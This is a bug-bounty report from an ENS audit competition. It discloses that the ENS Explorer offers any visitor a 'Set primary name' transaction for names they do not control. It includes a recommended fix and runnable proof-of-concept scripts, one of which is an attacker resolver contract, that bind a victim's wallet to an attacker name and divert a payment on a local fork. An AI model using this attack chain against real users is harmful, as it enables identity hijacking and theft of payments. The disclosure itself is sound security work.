# 91851 w a insight explorer certifies a victim s wallet as an attacker owned ens name name address offers set primary name for names the visitor has no relationship with

**Submitted on Sep 4th 2026 at 18:38:35 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91851
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

Description Summary

The Explorer's Address Resolution page, `/$name/address`, is the first item in every name's sidebar nav. It renders a red error banner with a **Set primary name** button whenever the name being viewed resolves to the connected wallet's address.

The predicate that decides whether to offer that button checks only that `connectedWallet == theName'sAddressRecord`. It never checks that the connected wallet owns, controls, or has any relationship with the name. But a name's address record is written by that name's owner, so on an attacker's name it is a value the attacker picks, with one `setAddr` and nothing whatsoever from the victim.

An attacker registers any `.eth` name, points its `addr(60)` record at a victim's address, and sends the victim the link. The Explorer greets the victim with a red "something is wrong" banner and a button offering to fix it. The button submits `ReverseRegistrar.setName("attacker.eth")` from the victim's own wallet. Because the forward record already points back at the victim, the ENSIP-3 bidirectional check now passes, and the victim's address is forward-verified across the whole ENS ecosystem as a name whose resolver the attacker controls. The attacker then repoints that name at themselves.

The sibling write in the very same hook, thirty lines away, is permission-gated. `useCanEditRecords({ name, roles: ['ROLE_SET_ADDR'] })` gates `startSetAddr`; nothing gates `startSetPrimaryName`. The mirror-image page gates its sidebar too: the reverse-resolution table passes `showMoreButton={canModify}`, the forward one passes nothing and `SidebarTriggerRow` defaults it to `true`. Two independently written gates for the same class of action, one present and one absent, cannot both be the design.

The one line that must change, `apps/portal/src/features/forward-resolution/components/AddressResolution/AddressResolutionSidebar.tsx:454-458`:

```ts
const canSetPrimaryName =
  !!connectedAddress &&
  !!data?.address &&
  isAddress(data.address, { strict: false }) &&
  isAddressEqual(connectedAddress, data.address)   // no check that this wallet controls `name`
```

The two on-chain results that prove the impact row, printed by Part B below on a local Anvil fork of Sepolia:

```
=== 5. The ecosystem now labels the victim's wallet with the attacker's name ===
  OK   getEnsName(VICTIM) - ENSIP-3 forward-verified: poc-primary-mtn98j01.eth

=== 7. A THIRD PARTY PAYS THE NAME - executed on chain, not narrated ===
  OK   the payer sent to the ATTACKER: 0x00000000000000000000000000000000000a11Ac
  OK   ATTACKER received the funds: 1000000000000000000
  OK   VICTIM received nothing: 0
```

Which sub-bullet is claimed, and which are not

Claimed: **Submitting malicious transactions**. The Explorer builds `setName("attacker.eth")` and submits it from a wallet the victim has already connected, with the argument taken from an attacker-controlled route parameter and no check that the wallet has any authority over that name. On the same facts, in the alternative, **Modifying transaction arguments or parameters** - the argument the app supplies, `args: [name]` at `:540` on the Mainnet row and `:551` on the Default row, is the entire defect.

Not claimed, so the review does not answer a bullet this report is not on:

* Substituting contract addresses - the `to` is the correct `ReverseRegistrar` for the row.
* Signing or submitting a transaction against the wrong chain - the chainId is correct.
* Inducing a blanket token approval - no approval of any kind is involved.

Also not claimed: the "display or pre-fill an incorrect address, name, or transaction detail" row. That row requires something incorrect to be displayed or pre-filled, and nothing here is. The page shows `attacker.eth`, the modal says `attacker.eth`, the calldata carries `attacker.eth`. The app is not lying about what it will do. What it will do is the harm.

And not the High "up to one click" row, which excludes this finding by its own qualifier: "Changing sensitive details of other users **without already-connected wallet interaction** and with up to one click of user interaction". This flow is precisely an already-connected wallet interaction, which is what puts it on the Critical already-connected-wallet row rather than below it.

Impact

Precondition: none on the victim. The attacker needs one name registration and one `setAddr` on their own name. The victim needs to have a wallet.

`status === 'mismatch'` is documented at `features/forward-resolution/components/hooks/useReverseMatch.ts:52-54` as "the verified view disagrees - no reverse record, a different name, or a name that fails forward verification". No reverse record is the default state of most wallets, and any victim whose primary name is not the attacker's also lands on `mismatch`. Every victim qualifies.

The chain, at a cost of one registration, 8.000021 USDC on the audited deployment:

1. Attacker registers `ens-support.eth`, or any plausible name, and owns its resolver.
2. Attacker calls `resolver.setAddr(namehash("ens-support.eth"), 60, VICTIM)`. This requires nothing from the victim: no signature, no approval, no NFT push. It is an ordinary permissionless write on the attacker's own name.
3. Attacker sends the victim `https://<explorer>/ens-support.eth/address`. Or sends nothing: the coin icons on any `/$name` profile link straight to this page, `features/profile/components/CoinRecord.tsx:47-51`.
4. The victim connects their wallet. The Explorer computes `canSetPrimaryName = true` and paints the red `bg-danger-fill` banner with an `XCircle` and a **Set primary name** button.
5. The victim clicks. `startSetPrimaryName()` submits `ReverseRegistrar.setName("ens-support.eth")` from the victim's wallet. **The claimed impact row is satisfied here.**
6. `addr(ens-support.eth, 60) == VICTIM` already, so the ENSIP-3 forward check passes. `getEnsName(VICTIM)` now returns the attacker's name with a match - which is precisely the Manager's own primary-name path, `apps/manager/src/features/profile/service/profileReverseName.ts:32-38`. The Manager renders the victim's own wallet as `ens-support.eth` in its header, avatar and `/$address` view, whose owner, registered and expires values are taken from the primary name (cf. WEB-1301), with the attacker's avatar and text records. The victim's previous primary name is silently overwritten.
7. Monetisation: the attacker repoints `addr(ens-support.eth, 60)` at themselves. Any counterparty who recorded "this wallet is ens-support.eth" and later resolves that name pays the attacker. Part B step 7 executes this on chain. It is corroboration that the transaction submitted at step 5 was not harmless; it is not where the impact lives.

The five L2 rows are worse. `setL2PrimaryName` at `AddressResolutionSidebar.tsx:560-585` bypasses the transaction modal entirely: `toast.loading(...)`, then `setL2ReverseNameAsync`, then a success toast after the fact. The code says so itself at `:556-558`, "so no transaction modal, toasts instead". Five of the seven rows on this page have no confirmation surface of any kind.

The victim's click is the mechanism, not a limitation. The app authors the entire inducement: it computes that something is wrong (`offerSetPrimary`, `:351`), renders a red destructive banner saying so (`:129-136`), and puts the remediation button inside that banner (`:368-378`) - for a state the attacker created unilaterally with one `setAddr` on their own name. A user who follows the app's own error banner to the app's own fix button is not taking an un-prompted action outside a normal workflow. They are doing the one thing the screen exists to tell them to do.

Root cause The missing check

`AddressResolutionSidebar.tsx:454-458`. The shipped comment states the only invariant the author had in mind, "setName is msg.sender-scoped". That is true and irrelevant. The question the predicate is actually answering is "should we invite this visitor to bind their identity to `name`?", and `data.address`, its sole input, is a value the owner of `name` writes.

`data.address` is built at `apps/portal/src/routes/$name/address.tsx:58-67` from `getProfileQueryOptions({ name })` to ensjs `getRecords` to the name's resolver. Attacker-authored, by construction.

The gate that fires is `AddressResolutionSidebar.tsx:351`, `const offerSetPrimary = status === 'mismatch' && canSetPrimaryName`.

What is submitted is `AddressResolutionSidebar.tsx:526-553`, where `name` is the route param of the page the victim is looking at - the attacker's name. There is no owner check, no role check, and no confirmation of what is being claimed.

The sibling that gets it right, twice

Same hook, same file, thirty lines apart. `useAddressRecordEditor` owns two writes and only one is permission-gated:

| Write                                                         | Line   | Gate                                                                                      |
| ------------------------------------------------------------- | ------ | ----------------------------------------------------------------------------------------- |
| `startSetAddr` - edit the name's `addr` record                | `:503` | `const { canEdit } = useCanEditRecords({ name, roles: ['ROLE_SET_ADDR'] })` at `:485-488` |
| `startSetPrimaryName` - bind the visitor's identity to `name` | `:526` | none on `name`, see `:454-458`                                                            |

The author knew how to ask "does this wallet have authority over `name`?" - `useCanEditRecords` in `features/records/hooks/useCanEditRecords.ts` does exactly that, and returns `isOwner` alongside `canEdit` - and used it for the less consequential of the two actions.

The mirror-image page gates its sidebar entirely. `apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/ReverseResolutionTable.tsx:62-64,101`:

```ts
// Only show "More" button if the displayed address matches the connected account
// Using isAddressEqual for case-insensitive comparison
const canModify = account ? isAddressEqual(account, address) : false
...
<SidebarTriggerRow showMoreButton={canModify} {...{ row, setOpen, setClickedRow, open }} />
```

The forward-side table passes no `showMoreButton` at all, `apps/portal/src/features/forward-resolution/components/AddressResolution/AddressResolutionTable.tsx:81-85`, and `components/SidebarTriggerRow.tsx:12` defaults it to `showMoreButton = true`. So on the forward page the sheet, and the button, are open to any visitor on any name.

What every confirmation surface renders

The whole flow is four screens. Each component was read rather than one string sampled.

Screen 1, the modal's landing view. `TransactionModal.tsx:28` initialises content state to `{ type: 'overview' }`, so clicking the banner's button lands here. `TransactionsOverviewContent` renders `{transaction.title}` at `:100`, which for this flow is the literal `'Set primary name'` (`AddressResolutionSidebar.tsx:598`), an `Est. Cost` row at `:170-183`, and a `Start` button at `:205`. The name does not appear on this screen at all - not the attacker's name, not the victim's current primary name, nothing.

That cost row is emptier than it looks. It renders `<EstimatedGasCost actor intent />` at `TransactionsOverviewContent.tsx:177-181`, which per its own docstring derives a figure "from a live `eth_estimateGas` on its encoded call" and otherwise shows "a neutral hint when there's nothing to estimate yet". This sidebar passes no `intent` (`AddressResolutionSidebar.tsx:596-604`), so the neutral hint is what renders. The descriptor's `estimatedGasCost: 0.0001` at `:600` is dead: `grep -rn estimatedGasCost apps/portal/src packages/` returns three write sites and no read site anywhere in the repo. Screen 1 does not even show the victim a number.

Screen 2, after `Start`. `TransactionStateContent` renders `{transaction.transactionName}` at `:113`, which is `` `Set ${name} as the primary name` `` (`AddressResolutionSidebar.tsx:599`), the same empty cost row, and a button wired to `activeTransaction.onStart` at `:175` which raises the wallet prompt. This sidebar passes no `steps` key, so the optional step list at `TransactionInfoContent:50-60` renders empty.

Screen 3, the wallet. `setName(string)` on `0xA0a1...C0C6`, an unverified ENSv1 registrar. Readable only by ABI-decoding the calldata by hand.

Screen 4, the five L2 rows: there is no modal.

So the complete set of strings the victim can read before signing is `Set primary name`, an `Est. Cost` row with no figure in it, and `Set <attacker's name> as the primary name`.

| Fact that decides the outcome                        | Screen 1 | Screen 2 | Wallet   | L2 rows | Anywhere on the page |
| ---------------------------------------------------- | -------- | -------- | -------- | ------- | -------------------- |
| Which name is being claimed                          | no       | yes      | hex only | no      | yes                  |
| That the name is owned by a third party              | no       | no       | no       | no      | **no**               |
| That its owner can repoint it at will, forever       | no       | no       | no       | no      | **no**               |
| That the victim's existing primary name is destroyed | no       | no       | no       | no      | **no**               |

The app shows the victim which name. It never shows them whose.

Recommendation

1. Gate the offer on the visitor having authority over the name, exactly as the sibling write already does. The hook is already called in this function.

```diff
--- a/apps/portal/src/features/forward-resolution/components/AddressResolution/AddressResolutionSidebar.tsx
@@
-  // Offered only when the connected wallet *is* this address (setName is
-  // msg.sender-scoped).
-  const canSetPrimaryName =
-    !!connectedAddress &&
-    !!data?.address &&
-    isAddress(data.address, { strict: false }) &&
-    isAddressEqual(connectedAddress, data.address)
+  // Two independent conditions, both required:
+  //  1. setName is msg.sender-scoped, so the row must be about this wallet;
+  //  2. the wallet must actually control `name` - otherwise we would be
+  //     inviting the user to adopt a third party's name, whose resolver that
+  //     third party can repoint at any time.
+  const { isOwner: ownsName, canEdit: controlsName } = useCanEditRecords({ name })
+  const canSetPrimaryName =
+    !!connectedAddress &&
+    !!data?.address &&
+    isAddress(data.address, { strict: false }) &&
+    isAddressEqual(connectedAddress, data.address) &&
+    (ownsName || controlsName)
```

2. Mirror the reverse table's gate on the trigger. `AddressResolutionTable.tsx` should pass `showMoreButton={canModify}`-style logic, or the sheet should render read-only for visitors with no authority over the name.
3. Make the confirmation honest. `AddressResolutionSidebar.tsx:599` should read something like: `Set ${name} as your primary name - ${name} is owned by ${ownerDisplay}, who can change where it points at any time. This replaces your current primary name (${currentPrimary}).` Every input needed is already fetched in this function.
4. Route the L2 path at `:560-585` through the same transaction modal instead of a bare toast.

## Proof of Concept

Proof of Concept

Both parts are self-contained and runnable. Part A is deterministic and offline. Part B runs on a **local Anvil fork of Sepolia** and refuses to start against any non-localhost RPC.

Environment

```bash
mkdir -p ens-poc && cd ens-poc
npm init -y >/dev/null
npm i viem@2
```

Part A - deterministic and offline: the predicate fires and the calldata is built

Reproduces `AddressResolutionSidebar.tsx:454-458` (`canSetPrimaryName`), `:351` (`offerSetPrimary`) and `:526-545` (`startSetPrimaryName`) verbatim, and prints the transaction the victim is asked to sign.

Save as `partA.mjs`:

```js
/* PoC Part A — deterministic, offline. Reproduces the exact decision logic of
 * apps/portal/src/features/forward-resolution/components/AddressResolution/
 *   AddressResolutionSidebar.tsx
 * and shows the calldata the Explorer submits from the victim's wallet. */
import { encodeFunctionData, isAddress, isAddressEqual, getAddress } from 'viem'

const VICTIM   = getAddress('0x1111111111111111111111111111111111111111')
const ATTACKER = getAddress('0x2222222222222222222222222222222222222222')

// ---- verbatim from AddressResolutionSidebar.tsx:454-458 -------------------
const canSetPrimaryNameFn = (connectedAddress, data) =>
  !!connectedAddress &&
  !!data?.address &&
  isAddress(data.address, { strict: false }) &&
  isAddressEqual(connectedAddress, data.address)

// ---- verbatim from AddressResolutionSidebar.tsx:351 -----------------------
const offerSetPrimaryFn = (status, canSetPrimaryName) =>
  status === 'mismatch' && canSetPrimaryName

// ---- verbatim from AddressResolutionSidebar.tsx:526-545 -------------------
// (@ensdomains/ensjs-abi/reverseRegistrar -> reverseRegistrarSetNameSnippet)
const reverseRegistrarSetNameSnippet = [{
  inputs: [{ name: 'name', type: 'string' }],
  name: 'setName',
  outputs: [{ name: '', type: 'bytes32' }],
  stateMutability: 'nonpayable',
  type: 'function',
}]
// packages/l2-primary/src/v1/reverseRegistrarChainIds.ts, key 60, sepolia
const SEPOLIA_REVERSE_REGISTRAR = '0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6'
const startSetPrimaryNameRequest = (name) => ({
  address: SEPOLIA_REVERSE_REGISTRAR,
  abi: reverseRegistrarSetNameSnippet,
  functionName: 'setName',
  args: [name],
})
// --------------------------------------------------------------------------

// The row the Explorer builds for /$name/address, "Mainnet" (coin 60), after
// the attacker has run setAddr(namehash("attacker-controlled.eth"), 60, VICTIM)
const row = {
  coinType: 60,
  label: 'Mainnet',
  address: VICTIM,   // <- attacker-chosen, written on the ATTACKER's resolver
  reverseMatch: 'mismatch',
  reverseName: null,
}
const NAME_BEING_VIEWED = 'attacker-controlled.eth'  // owned by ATTACKER

const canSetPrimaryName = canSetPrimaryNameFn(VICTIM, row)
const offerSetPrimary   = offerSetPrimaryFn(row.reverseMatch, canSetPrimaryName)

console.log('page                 : /' + NAME_BEING_VIEWED + '/address   (owner = ATTACKER)')
console.log('connected wallet     :', VICTIM, '(VICTIM)')
console.log('row.address (coin 60):', row.address, "<- set by ATTACKER on ATTACKER's resolver")
console.log('row.reverseMatch     :', row.reverseMatch)
console.log('')
console.log('canSetPrimaryName    :', canSetPrimaryName, '  <-- TRUE: only checks wallet == row.address')
console.log('offerSetPrimary      :', offerSetPrimary,  '  <-- red banner + "Set primary name" button rendered')
console.log('')

const req  = startSetPrimaryNameRequest(NAME_BEING_VIEWED)
const data = encodeFunctionData({ abi: req.abi, functionName: req.functionName, args: req.args })
console.log('transaction the VICTIM is asked to sign:')
console.log('  to      :', req.address, '(ENSv1 ReverseRegistrar, Sepolia)')
console.log('  from    :', VICTIM)
console.log('  data    :', data)
console.log('  decoded : setName("' + req.args[0] + '")')
console.log('')
console.log('gate on startSetAddr       (line 485): useCanEditRecords({ name, roles:["ROLE_SET_ADDR"] })')
console.log('gate on startSetPrimaryName(line 454): (none on `name`) ->', canSetPrimaryName)

if (!offerSetPrimary) { console.error('\nFAIL: predicate did not reproduce'); process.exit(1) }
console.log('\nPASS: the Explorer offers, and builds, a setName() binding the victim\'s')
console.log('      address to a name chosen entirely by the attacker.')
```

**Captured output (actually run):**

```
page                 : /attacker-controlled.eth/address   (owner = ATTACKER)
connected wallet     : 0x1111111111111111111111111111111111111111 (VICTIM)
row.address (coin 60): 0x1111111111111111111111111111111111111111 <- set by ATTACKER on ATTACKER's resolver
row.reverseMatch     : mismatch

canSetPrimaryName    : true   <-- TRUE: only checks wallet == row.address
offerSetPrimary      : true   <-- red banner + "Set primary name" button rendered

transaction the VICTIM is asked to sign:
  to      : 0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6 (ENSv1 ReverseRegistrar, Sepolia)
  from    : 0x1111111111111111111111111111111111111111
  data    : 0xc47f00270000000000000000000000000000000000000000000000000000000000000020
             00000000000000000000000000000000000000000000000000000000000000176174746
             1636b65722d636f6e74726f6c6c65642e657468000000000000000000
  decoded : setName("attacker-controlled.eth")

gate on startSetAddr       (line 485): useCanEditRecords({ name, roles:["ROLE_SET_ADDR"] })
gate on startSetPrimaryName(line 454): (none on `name`) -> true

PASS: the Explorer offers, and builds, a setName() binding the victim's
      address to a name chosen entirely by the attacker.
```

Part B - end to end on a local Anvil fork of Sepolia, executed, all assertions pass

Part B runs against the **v2 ENS deployment the app is actually configured against** — `extendChainWithEns(customSepolia)`, `apps/portal/src/lib/wagmi.ts:58`. That is the v2 registry `0xBDC8…F0E2` and the UniversalResolver `0xeEeE…EeEe`, *not* the legacy registry; every address in the script was printed from the repo's own chain config rather than looked up externally. Name acquisition is a **real commit/reveal registration on the v2 `ensEthRegistrar`**, paid in the deployment's USDC — the attack's entire cost is the 8.000021 USDC the run prints.

Steps 1–6 arm and land the defect. **Step 7 executes the payer transaction**: a third party resolves the name through the same UniversalResolver the app uses and sends 1 ETH to the result, and the run asserts the ETH arrives at the attacker and not at the victim. **Step 8** then has the victim revoke and asserts the ETH is still at the attacker.

```bash
mkdir -p ens-poc/sol && cd ens-poc
npm init -y >/dev/null && npm i viem@2
# save AttackerResolver.sol into sol/, partB.mjs into the root
forge build --contracts sol --out out
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --port 8545 &
node partB.mjs
```

`sol/AttackerResolver.sol` — the resolver the attacker writes and owns. Nothing about the attack depends on it being unusual; it is the minimum a resolver can be:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// Minimal ENS resolver, authored and owned by the ATTACKER.
/// This is the realistic deployment: the report's claim is that the victim's
/// address ends up bound to "a name whose resolver the attacker controls".
contract AttackerResolver {
    address public owner;
    mapping(bytes32 => address) private addrs;

    constructor(address _owner) { owner = _owner; }

    function setAddr(bytes32 node, address a) external {
        require(msg.sender == owner, "not owner");
        addrs[node] = a;
    }

    function addr(bytes32 node) external view returns (address payable) {
        return payable(addrs[node]);
    }

    // addr(bytes32,uint256) multicoin form, coinType 60 == EVM
    function addr(bytes32 node, uint256 coinType) external view returns (bytes memory) {
        if (coinType != 60) return "";
        return abi.encodePacked(addrs[node]);
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x3b3b57de || id == 0xf1cb7e06;
    }
}
```

`partB.mjs`:

```js
/* PoC Part B — end-to-end on a LOCAL Anvil fork of Sepolia (ENS v2 deployment,
 * the exact stack apps/portal is configured against).
 *
 *   attacker registers a .eth name on the v2 EthRegistrar
 *   -> attacker points it at the VICTIM on a resolver the attacker wrote
 *   -> Explorer's /$name/address offers the VICTIM "Set primary name"
 *   -> VICTIM clicks; the app sends setName("attacker.eth") from the victim's wallet
 *   -> getEnsName(VICTIM) is now the attacker's name, ENSIP-3 forward-verified
 *   -> attacker repoints the name at themselves
 *   -> A THIRD PARTY RESOLVES THE NAME AND PAYS IT. THE ETH LANDS AT THE ATTACKER.
 *   -> VICTIM revokes. The paid ETH stays with the attacker.
 *
 * Run:
 *   anvil --fork-url <sepolia rpc> --port 8545
 *   forge build --contracts sol --out out
 *   node partB.mjs
 */
import {
  createPublicClient, createWalletClient, http, encodeFunctionData, encodeDeployData,
  isAddress, isAddressEqual, namehash, getAddress, parseAbi, keccak256, toHex,
  parseEther, formatEther, zeroAddress,
} from 'viem'
import { sepolia } from 'viem/chains'
import { getEnsName, getEnsAddress } from 'viem/actions'
import { readFileSync } from 'node:fs'

const RPC = process.env.POC_RPC ?? 'http://127.0.0.1:8545'
if (!/^https?:\/\/(127\.0\.0\.1|localhost)(:|\/|$)/.test(RPC)) {
  throw new Error('refusing to run against a non-local RPC: ' + RPC)
}

// Every address below comes from the repo's own chain config
// (`extendChainWithEns(customSepolia)` in apps/portal/src/lib/wagmi.ts:58),
// printed via @ensdomains/ensjs/chain. None are invented.
const ETH_REGISTRAR    = getAddress('0xa88553F454b77203B0D036A05c894d555EAAa2Cc') // ensEthRegistrar
const USDC             = getAddress('0x768F42455A2D082E23ceeF7d51e5787C82d67a39') // payment token
// packages/l2-primary/src/v1/reverseRegistrarChainIds.ts:63 (coinType 60, sepolia)
const REVERSE_REGISTRAR = getAddress('0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6')

const ATTACKER    = getAddress('0x00000000000000000000000000000000000a11ac')
const VICTIM      = getAddress('0x0000000000000000000000000000000000001c11')
const THIRD_PARTY = getAddress('0x00000000000000000000000000000000000003d0')

const LABEL = 'poc-primary-' + Date.now().toString(36)
const NAME  = `${LABEL}.eth`
const NODE  = namehash(NAME)
const PAYMENT = parseEther('1')
const DURATION = 31536000n
const SECRET = keccak256(toHex('poc-secret'))
const REFERRER = `0x${'00'.repeat(32)}`

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const erc20Abi = parseAbi([
  'function approve(address,uint256)', 'function mint(address,uint256)',
  'function balanceOf(address) view returns (uint256)',
])
const reverseRegistrarAbi = parseAbi(['function setName(string name) returns (bytes32)'])
const RESOLVER_ART = JSON.parse(readFileSync(
  new URL('./out/AttackerResolver.sol/AttackerResolver.json', import.meta.url)))

const transport = http(RPC)
const pub = createPublicClient({ chain: sepolia, transport })
const rpc = (method, params = []) => pub.request({ method, params })
const fund = (a) => rpc('anvil_setBalance', [a, '0x56BC75E2D63100000'])

const send = async (account, to, data, value) => {
  await rpc('anvil_impersonateAccount', [account])
  const w = createWalletClient({ account, chain: sepolia, transport })
  const hash = await w.sendTransaction({ to, data, value, account, chain: null })
  const r = await pub.waitForTransactionReceipt({ hash })
  await rpc('anvil_stopImpersonatingAccount', [account])
  if (r.status !== 'success') throw new Error('tx reverted: ' + hash)
  return r
}
const deploy = async (account, bytecode) => {
  await rpc('anvil_impersonateAccount', [account])
  const w = createWalletClient({ account, chain: sepolia, transport })
  const hash = await w.sendTransaction({ data: bytecode, account, chain: null, to: null })
  const r = await pub.waitForTransactionReceipt({ hash })
  await rpc('anvil_stopImpersonatingAccount', [account])
  if (!r.contractAddress) throw new Error('deploy failed')
  return getAddress(r.contractAddress)
}

const step = (n, s) => console.log(`\n=== ${n}. ${s} ===`)
const eq = (label, got, want) => {
  const ok = String(got).toLowerCase() === String(want).toLowerCase()
  console.log(`  ${ok ? 'OK  ' : 'FAIL'} ${label}: ${got}${ok ? '' : `  (expected ${want})`}`)
  if (!ok) process.exitCode = 1
}
const bal = (a) => pub.getBalance({ address: a })

console.log('fork RPC :', RPC, '| block', await pub.getBlockNumber(), '| name', NAME)
for (const a of [ATTACKER, VICTIM, THIRD_PARTY]) await fund(a)

// ---------------------------------------------------------------- 1
step(1, 'Attacker registers an ordinary .eth name on the v2 EthRegistrar')
const RESOLVER = await deploy(ATTACKER, encodeDeployData({
  abi: RESOLVER_ART.abi, bytecode: RESOLVER_ART.bytecode.object, args: [ATTACKER] }))
console.log('  attacker-authored resolver:', RESOLVER)
const [base, premium] = await pub.readContract({
  address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'getRegisterPrice',
  args: [LABEL, DURATION, USDC] })
const price = base + premium
console.log('  register price:', Number(price) / 1e6, 'USDC — the entire cost of this attack')
await send(ATTACKER, USDC, encodeFunctionData({ abi: erc20Abi, functionName: 'mint', args: [ATTACKER, price * 2n] }))
await send(ATTACKER, USDC, encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [ETH_REGISTRAR, price * 2n] }))
const commitment = await pub.readContract({
  address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'makeCommitment',
  args: [LABEL, ATTACKER, SECRET, zeroAddress, RESOLVER, DURATION, REFERRER] })
await send(ATTACKER, ETH_REGISTRAR, encodeFunctionData({ abi: registrarAbi, functionName: 'commit', args: [commitment] }))
await rpc('evm_increaseTime', [Number(await pub.readContract({
  address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'MIN_COMMITMENT_AGE' })) + 60])
await rpc('evm_mine', [])
await send(ATTACKER, ETH_REGISTRAR, encodeFunctionData({
  abi: registrarAbi, functionName: 'register',
  args: [LABEL, ATTACKER, SECRET, zeroAddress, RESOLVER, DURATION, USDC, REFERRER] }))
console.log(`  registered ${NAME} to ATTACKER`)

// ---------------------------------------------------------------- 2
step(2, 'Attacker points their name AT THE VICTIM — one tx, zero victim involvement')
await send(ATTACKER, RESOLVER, encodeFunctionData({
  abi: RESOLVER_ART.abi, functionName: 'setAddr', args: [NODE, VICTIM] }))
eq(`getEnsAddress(${NAME}) via the app's UniversalResolver`,
   await getEnsAddress(pub, { name: NAME }), VICTIM)

// ---------------------------------------------------------------- 3
step(3, `What the Explorer renders on /${NAME}/address for the VICTIM`)
const rowAddress = await getEnsAddress(pub, { name: NAME })   // routes/$name/address.tsx:58-67
const before = await getEnsName(pub, { address: VICTIM })
// AddressResolutionSidebar.tsx:454-458 — verbatim
const canSetPrimaryName =
  !!VICTIM && !!rowAddress && isAddress(rowAddress, { strict: false }) &&
  isAddressEqual(VICTIM, rowAddress)
// useReverseMatch.ts:52-54
const status = before && before.toLowerCase() === NAME ? 'verified' : 'mismatch'
// AddressResolutionSidebar.tsx:351
const offerSetPrimary = status === 'mismatch' && canSetPrimaryName
console.log('  victim primary name before :', before)
console.log('  row.reverseMatch           :', status)
eq('canSetPrimaryName', canSetPrimaryName, true)
eq('offerSetPrimary — red banner + "Set primary name" button rendered', offerSetPrimary, true)

// ---------------------------------------------------------------- 4
step(4, 'VICTIM clicks "Set primary name" — the exact tx AddressResolutionSidebar builds')
const data = encodeFunctionData({ abi: reverseRegistrarAbi, functionName: 'setName', args: [NAME] })
console.log('  to  :', REVERSE_REGISTRAR, '(ENSv1 ReverseRegistrar — getRegistrarAddress(60,"sepolia"))')
console.log('  from:', VICTIM)
console.log('  data:', data.slice(0, 34) + '…   = setName("' + NAME + '")')
await send(VICTIM, REVERSE_REGISTRAR, data)

// ---------------------------------------------------------------- 5
step(5, "The ecosystem now labels the victim's wallet with the attacker's name")
eq('getEnsName(VICTIM) — ENSIP-3 forward-verified', await getEnsName(pub, { address: VICTIM }), NAME)

// ---------------------------------------------------------------- 6
step(6, 'Attacker repoints the name at themselves')
await send(ATTACKER, RESOLVER, encodeFunctionData({
  abi: RESOLVER_ART.abi, functionName: 'setAddr', args: [NODE, ATTACKER] }))
eq(`getEnsAddress(${NAME})`, await getEnsAddress(pub, { name: NAME }), ATTACKER)

// ---------------------------------------------------------------- 7
step(7, 'A THIRD PARTY PAYS THE NAME — executed on chain, not narrated')
console.log(`  THIRD_PARTY saw "VICTIM = ${NAME}" in step 5 and pays that name`)
console.log('  the way every wallet does: resolve the name, then send to the result.')
const attackerBefore = await bal(ATTACKER)
const victimBefore   = await bal(VICTIM)
const resolved = await getEnsAddress(pub, { name: NAME })
console.log(`  getEnsAddress("${NAME}") ->`, resolved)
await send(THIRD_PARTY, resolved, '0x', PAYMENT)
const attackerDelta = (await bal(ATTACKER)) - attackerBefore
const victimDelta   = (await bal(VICTIM)) - victimBefore
console.log('  attacker balance delta :', formatEther(attackerDelta), 'ETH')
console.log('  victim   balance delta :', formatEther(victimDelta), 'ETH')
eq('the payer sent to the ATTACKER', resolved, ATTACKER)
eq('ATTACKER received the funds', attackerDelta, PAYMENT)
eq('VICTIM received nothing',     victimDelta,   0n)

// ---------------------------------------------------------------- 8
step(8, 'Recovery enumeration — the STATE is revocable, the FUNDS are not')
await send(VICTIM, REVERSE_REGISTRAR, encodeFunctionData({
  abi: reverseRegistrarAbi, functionName: 'setName', args: [''] }))
console.log('  victim setName("") -> getEnsName(VICTIM) =', await getEnsName(pub, { address: VICTIM }))
const stillHeld = (await bal(ATTACKER)) - attackerBefore
console.log('  attacker still holds   :', formatEther(stillHeld), 'ETH')
eq('the payment is NOT clawed back by the revoke', stillHeld, PAYMENT)

// ---------------------------------------------------------------- 9
step(9, 'Re-arming: one setAddr and the red banner is back')
await send(ATTACKER, RESOLVER, encodeFunctionData({
  abi: RESOLVER_ART.abi, functionName: 'setAddr', args: [NODE, VICTIM] }))
const rowAgain = await getEnsAddress(pub, { name: NAME })
const nameAgain = await getEnsName(pub, { address: VICTIM })
const statusAgain = nameAgain && nameAgain.toLowerCase() === NAME ? 'verified' : 'mismatch'
eq('offerSetPrimary fires again', statusAgain === 'mismatch' && isAddressEqual(VICTIM, rowAgain), true)

console.log(process.exitCode ? '\nFAILED' : '\nALL ASSERTIONS PASSED')
```

**Captured output (actually executed, verbatim):**

```
fork RPC : http://127.0.0.1:8545 | block 11635031n | name poc-primary-mtn98j01.eth

=== 1. Attacker registers an ordinary .eth name on the v2 EthRegistrar ===
  attacker-authored resolver: 0x228851130DC126a2DE1d95229934F198aE3cDBc7
  register price: 8.000021 USDC — the entire cost of this attack
  registered poc-primary-mtn98j01.eth to ATTACKER

=== 2. Attacker points their name AT THE VICTIM — one tx, zero victim involvement ===
  OK   getEnsAddress(poc-primary-mtn98j01.eth) via the app's UniversalResolver: 0x0000000000000000000000000000000000001c11

=== 3. What the Explorer renders on /poc-primary-mtn98j01.eth/address for the VICTIM ===
